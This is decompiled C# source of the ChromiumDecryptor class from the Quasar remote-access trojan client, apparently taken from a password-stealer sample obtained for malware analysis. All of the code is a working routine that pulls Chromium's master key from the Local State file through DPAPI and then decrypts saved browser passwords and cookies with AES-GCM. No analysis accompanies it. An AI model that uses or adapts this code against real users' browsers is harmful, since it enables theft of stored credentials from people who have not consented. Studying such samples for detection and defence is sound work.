// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Recovery.Browsers.ChromiumDecryptor
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Quasar.Client.Recovery.Browsers
{
  public class ChromiumDecryptor
  {
    private readonly byte[] _key;

    public ChromiumDecryptor(string localStatePath)
    {
      try
      {
        if (!File.Exists(localStatePath))
          return;
        string str = File.ReadAllText(localStatePath);
        int startIndex = str.IndexOf("encrypted_key") + "encrypted_key".Length + 3;
        this._key = ProtectedData.Unprotect(((IEnumerable<byte>) Convert.FromBase64String(str.Substring(startIndex).Substring(0, str.Substring(startIndex).IndexOf('"')))).Skip<byte>(5).ToArray<byte>(), (byte[]) null, DataProtectionScope.CurrentUser);
      }
      catch (Exception ex)
      {
      }
    }

    public string Decrypt(string cipherText)
    {
      byte[] bytes = Encoding.Default.GetBytes(cipherText);
      return cipherText.StartsWith("v10") && this._key != null ? Encoding.UTF8.GetString(this.DecryptAesGcm(bytes, this._key, 3)) : Encoding.UTF8.GetString(ProtectedData.Unprotect(bytes, (byte[]) null, DataProtectionScope.CurrentUser));
    }

    private byte[] DecryptAesGcm(byte[] message, byte[] key, int nonSecretPayloadLength)
    {
      if (key == null || key.Length != 32)
        throw new ArgumentException(string.Format("Key needs to be {0} bit!", (object) 256), nameof (key));
      if (message == null || message.Length == 0)
        throw new ArgumentException("Message required!", nameof (message));
      using (MemoryStream input1 = new MemoryStream(message))
      {
        using (BinaryReader binaryReader = new BinaryReader((Stream) input1))
        {
          binaryReader.ReadBytes(nonSecretPayloadLength);
          byte[] nonce = binaryReader.ReadBytes(12);
          GcmBlockCipher gcmBlockCipher = new GcmBlockCipher((IBlockCipher) new AesEngine());
          AeadParameters parameters = new AeadParameters(new Org.BouncyCastle.Crypto.Parameters.KeyParameter(key), 128, nonce);
          gcmBlockCipher.Init(false, (ICipherParameters) parameters);
          byte[] input2 = binaryReader.ReadBytes(message.Length);
          byte[] output = new byte[gcmBlockCipher.GetOutputSize(input2.Length)];
          try
          {
            int outOff = gcmBlockCipher.ProcessBytes(input2, 0, input2.Length, output, 0);
            gcmBlockCipher.DoFinal(output, outOff);
          }
          catch (InvalidCipherTextException ex)
          {
            return (byte[]) null;
          }
          return output;
        }
      }
    }
  }
}
